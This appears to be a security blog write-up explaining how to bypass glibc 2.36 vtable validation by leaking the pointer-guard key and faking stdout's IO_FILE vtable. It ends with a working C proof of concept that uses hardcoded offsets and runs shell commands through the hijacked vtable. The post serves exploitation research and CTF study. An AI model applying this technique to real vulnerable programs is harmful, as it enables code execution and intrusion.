<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0] | </title><meta name="keywords" content="Vulnerability,PWN,CTF"><meta name="author" content="KpwnZ"><meta name="copyright" content="KpwnZ"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0] Since vtables were added to a specific read-only segment in GLIBC and IO_validate_vtable() will verify the vtable of IO_FILE structure,">
<meta property="og:type" content="article">
<meta property="og:title" content="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]">
<meta property="og:url" content="https://kpwnz.github.io/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/index.html">
<meta property="og:site_name">
<meta property="og:description" content="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0] Since vtables were added to a specific read-only segment in GLIBC and IO_validate_vtable() will verify the vtable of IO_FILE structure,">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://source.unsplash.com/featured/?landscape,tech,life">
<meta property="article:published_time" content="2022-09-26T12:24:42.000Z">
<meta property="article:modified_time" content="2022-09-30T05:52:25.497Z">
<meta property="article:author" content="KpwnZ">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://source.unsplash.com/featured/?landscape,tech,life"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://kpwnz.github.io/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x0]',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-30 13:52:25'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/22996989?s=400&amp;u=470b81ce0dd0fd2e15880f564e1bef0ba9655225&amp;v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">16</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://source.unsplash.com/featured/?landscape,tech,life')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-09-26T12:24:42.000Z" title="Created 2022-09-26 20:24:42">2022-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-09-30T05:52:25.497Z" title="Updated 2022-09-30 13:52:25">2022-09-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Code Execution by Faking IO_FILE-&gt;vtable in GLIBC 2.36 [0x0]</h1>
<p>Since vtables were added to a specific read-only segment in GLIBC and <code>IO_validate_vtable()</code> will verify the <code>vtable</code> of <code>IO_FILE</code> structure, exploitation of <code>IO_FILE-&gt;vtable</code> is becoming much more complex than before. Although we have some great exploitation chains such as House of banana or House of apple, some of them require a series of complex structure construction. So I would like to put forward another way to exploit <code>IO_FILE-&gt;vtable</code> here which can enable the attacker to gain code execution by faking <code>vtable</code> directly.</p>
<h2 id="vtable-validation">vtable validation</h2>
<p>When calling the method in <code>vtable</code>, GLIBC will call <code>IO_validate_vtable</code> first</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br></pre></td></tr></table></figure>
<p>when <code>vtable</code> isn’t located in <code>__libc_IO_vtables</code>, it will then invoke <code>IO_vtable_check()</code> to do further validation.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> struct _IO_jump_t *</span></span><br><span class="line"><span class="function"><span class="title">IO_validate_vtable</span> <span class="params">(<span class="keyword">const</span> struct _IO_jump_t *vtable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>vtable</code> is actually kind of a implementation of polymorphism, so there may be a chance to modify the <code>vtable</code> pointer to perform custom IO operations. In <code>IO_vtable_check()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can notice that it does give us a chance to use another foreign vtable. Now the question becomes how can we bypass the checking here.</p>
<p>Let’s take a look at</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">    || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">  <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>
<p>First, <code>!rtlf_active()</code> seems a great choice. But the value it returns is based on a value in read-only memory. Then what about <code>_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0</code>? This line is performed to check the ld namespace of a given address. To bypass it we are required to construct a really complex linker-related structure. So let’s check the very first <code>flag</code> checking.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>
<p><code>_IO_check_vtable</code> will load <code>IO_accept_foreign_vtables</code> and compare it against with <code>_IO_vtable_check</code> and luckily <code>IO_accept_foreign_vtables</code> is writable! So the problem is how can we defeat the <code>PTR_MANGLE</code> stuff.</p>
<h2 id="Defeat-PTR-MAGLE">Defeat <code>PTR_MAGLE</code></h2>
<p>Pointer guard is used to proctect some critical pointers from being forged. We can use the following pseudocode to compute a <code>PTR_MANGLE</code>d pointer value.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rol(ptr ^ pointer_guard, <span class="number">0x11</span>)</span><br></pre></td></tr></table></figure>
<p>to demangle we can just</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ror(ptr, <span class="number">0x11</span>) ^ pointer_guard</span><br></pre></td></tr></table></figure>
<p>Now the problem becomes how can we leak or overwrite the pointer_guard.</p>
<p>Pointer guard is located in TLS structure. Although we do have method to modify the value, but why not ROP directly when we have this kind of primitive. So let’s take a look at how to leak pointer guard.</p>
<p>We have two ways to do so. Directly leak them from TLS or leak a mangled pointer and then calculate the pointer_guard xor key.</p>
<p>Leaking from TLS requires us to leak TLS address first so we will focu on the second method here.</p>
<p>Fortunately we do have a mangled pointer! Consider the following code.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall __noreturn _libc_start_main(</span><br><span class="line">        <span class="keyword">int</span> (__fastcall *main)(<span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">char</span> **),</span><br><span class="line">        <span class="keyword">int</span> argc,</span><br><span class="line">        <span class="keyword">char</span> **ubp_av,</span><br><span class="line">        <span class="keyword">void</span> (*init)(<span class="keyword">void</span>),</span><br><span class="line">        <span class="keyword">void</span> (*fini)(<span class="keyword">void</span>),</span><br><span class="line">        <span class="keyword">void</span> (*rtld_fini)(<span class="keyword">void</span>),</span><br><span class="line">        <span class="keyword">void</span> *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> **v12; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 v14; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v15; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall **v16)(_QWORD, <span class="keyword">char</span> **, <span class="keyword">char</span> **, _QWORD, <span class="keyword">void</span> (*)(<span class="keyword">void</span>)); <span class="comment">// rcx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall **v18)(_QWORD, <span class="keyword">char</span> **, <span class="keyword">char</span> **, _QWORD, <span class="keyword">void</span> (*)(<span class="keyword">void</span>)); <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> **v19; <span class="comment">// [rsp+0h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> **v20; <span class="comment">// [rsp+0h] [rbp-48h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( rtld_fini )</span><br><span class="line">    _cxa_atexit(rtld_fini, <span class="number">0LL</span>, <span class="number">0LL</span>, init, fini);</span><br></pre></td></tr></table></figure>
<p>When calling <code>_cxa_atexit</code>, <code>rdi==_dl_fini</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__GI___cxa_atexit (</span><br><span class="line">   QWORD var_0 = 0x007ffff7fceaa0 → &lt;_dl_fini+0&gt; push rbp,</span><br><span class="line">   QWORD var_1 = 0x00000000000000,</span><br><span class="line">   QWORD var_2 = 0x00000000000000</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><code>_cxa_atexit</code> will then register the function to <code>_exit_function</code> after mangling!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__internal_atexit (<span class="keyword">void</span> (*func) (<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">void</span> *d,</span><br><span class="line">		   struct exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* As a QoI issue we detect NULL early with an assertion instead</span></span><br><span class="line"><span class="comment">     of a SIGSEGV at program exit when the handler is run (bug 20544).  */</span></span><br><span class="line">  assert (func != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">new</span> = __new_exitfn (listp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">new</span> == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE (func);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">new</span>-&gt;func.cxa.fn = (<span class="keyword">void</span> (*) (<span class="keyword">void</span> *, <span class="keyword">int</span>)) func;</span><br><span class="line">  <span class="keyword">new</span>-&gt;func.cxa.arg = arg;</span><br><span class="line">  <span class="keyword">new</span>-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  <span class="keyword">new</span>-&gt;flavor = ef_cxa;</span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>So leaking <code>_dl_fini</code> in <code>_exit_function</code> means leaking xor key now. Then override <code>IO_accepte_foreign_vtable</code> with a mangled <code>_IO_vtable_check</code> pointer, we are able to use any vtable to completely take over the control flow.</p>
<p>Here is an example.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">u_int64_t</span> <span class="title">ror</span><span class="params">(<span class="keyword">u_int64_t</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n &gt;&gt; d) | (n &lt;&lt; (<span class="number">64</span> - d));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">u_int64_t</span> <span class="title">rol</span><span class="params">(<span class="keyword">u_int64_t</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n &lt;&lt; d) | (n &gt;&gt; (<span class="number">64</span> - d));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo fake_vtable&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch pwn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> libcbase = ((<span class="keyword">u_int64_t</span>)&amp;<span class="built_in">free</span> - <span class="number">0xa5460</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libcbase 0x%llx\n&quot;</span>, libcbase);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get encoded _dl_fini pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> dlfini = *(<span class="keyword">u_int64_t</span> *)(libcbase + <span class="number">0x21af18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _dl_fini: 0x%llx\n&quot;</span>, dlfini);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get xor key\n&quot;</span>);</span><br><span class="line">    dlfini = ror(dlfini, <span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">u_int64_t</span> key = dlfini ^ (libcbase + <span class="number">0x409040</span>); <span class="comment">// real _dl_fini, in ld.so actually </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] got xor key 0x%llx\n&quot;</span>, key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">u_int64_t</span> iotablecheck = libcbase + <span class="number">0x89f70</span>;</span><br><span class="line">    <span class="keyword">u_int64_t</span> encoded_io_table_check = rol(iotablecheck^key, <span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">u_int64_t</span> IO_accept_foreign_vtables = libcbase + <span class="number">0x21ba28</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] override flag\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">u_int64_t</span>*)IO_accept_foreign_vtables = encoded_io_table_check;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x8</span>*<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_vtable, <span class="number">0x41</span>, <span class="number">0x8</span>*<span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">u_int64_t</span> *)((<span class="keyword">u_int64_t</span>)(<span class="built_in">stdout</span>) + <span class="number">0xd8</span>) = (<span class="keyword">u_int64_t</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x50</span><span class="number">-2</span>; ++i) ((<span class="keyword">u_int64_t</span> *)fake_vtable)[i+<span class="number">2</span>] = &amp;pwn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Run the example with a simple script</p>
